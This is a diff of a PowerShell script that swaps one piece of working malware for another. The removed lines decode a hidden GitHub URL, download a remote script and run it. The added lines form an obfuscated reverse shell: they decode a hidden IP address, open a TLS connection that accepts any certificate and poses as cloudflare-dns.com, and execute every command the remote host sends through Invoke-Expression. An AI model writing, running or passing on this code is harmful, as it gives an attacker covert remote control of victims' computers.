@@ -1,15 +1,58 @@
-$v = 1
-if ($v -eq 1) {
-    try {
-        $u = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AagBrAHQAdgB6AC8ASgAvAG0AYQBpAG4ALwBhAC4AcABzADEA'))
+
+$Active = 1; 
+
+
+if ($Active -ne 1) { exit }
+
+
+try {
+    $sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12;
+    
+    
+    $targetIP = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('MTQ2LjcwLjI0MC4yMDU='));
+    $port = 54983;
+
+    $TCPClient = New-Object Net.Sockets.TCPClient($targetIP, $port);
+    $NetworkStream = $TCPClient.GetStream();
+    
+    
+    $SslStream = New-Object Net.Security.SslStream($NetworkStream, $false, ({$true} -as [Net.Security.RemoteCertificateValidationCallback]));
+    $SslStream.AuthenticateAsClient("cloudflare-dns.com", $null, $sslProtocols, $false);
+
+    if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {
+        $SslStream.Close();
+        exit;
+    }
+
+    $StreamWriter = New-Object IO.StreamWriter($SslStream);
+    $StreamWriter.AutoFlush = $true;
+
+    # Function to format the shell prompt
+    function WriteToStream ($String) {
+        [byte[]]$script:Buffer = New-Object System.Byte[] 4096;
+        $StreamWriter.Write($String + "PS " + (Get-Location).Path + "> ");
+    };
+
+    WriteToStream '';
+
+    
+    while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
+        $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1).Trim();
         
-        $t = "Net.Web" + "Client"
-        $o = New-Object $t
-        $o.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+        if ($Command -eq 'exit') { break }
         
-        $b = $o."DownloadData"($u)
-        $s = [System.Text.Encoding]::UTF8.GetString($b)
+        $Output = try {
+            Invoke-Expression $Command 2>&1 | Out-String
+        } catch {
+            $_ | Out-String
+        }
         
-        $ExecutionContext.InvokeCommand.InvokeScript($s)
-    } catch { exit }
+        WriteToStream ($Output);
+    }
+
+    $StreamWriter.Close();
+    $TCPClient.Close();
+} catch {
+
+    exit;
 }
